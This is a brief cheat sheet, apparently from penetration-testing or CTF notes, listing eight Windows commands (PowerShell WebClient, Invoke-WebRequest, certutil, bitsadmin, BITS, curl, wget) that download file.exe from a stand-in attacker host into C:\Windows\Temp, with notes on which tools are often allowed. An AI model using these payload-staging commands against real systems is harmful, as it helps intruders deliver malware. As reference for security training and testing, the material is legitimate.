## File Transfer
1.PowerShell WebClient (very common)
powershell -c "(New-Object System.Net.WebClient).DownloadFile('http://10.10.10.10/file.exe', 'C:\Windows\Temp\file.exe')"
2.Invoke-WebRequest (IWR) (extremely common)
powershell -c "Invoke-WebRequest -Uri 'http://10.10.10.10/file.exe' -OutFile 'C:\Windows\Temp\file.exe'"
3.Short version: IWR http://10.10.10.10/file.exe -OutFile C:\Windows\Temp\file.exe
4.Certutil (very common, often allowed)
certutil -urlcache -split -f http://10.10.10.10/file.exe C:\Windows\Temp\file.exe
5.Bitsadmin (classic, still appears often)
bitsadmin /transfer myjob /download /priority normal http://10.10.10.10/file.exe C:\Windows\Temp\file.exe
6.Start-BitsTransfer (PowerShell BITS)
Start-BitsTransfer -Source http://10.10.10.10/file.exe -Destination C:\Windows\Temp\file.exe
7.Curl (common if curl is installed or on newer Windows)
curl http://10.10.10.10/file.exe -o C:\Windows\Temp\file.exe
8. wget (If installed)
wget -O C:\path\to\file.exe http://example.com/file.exe
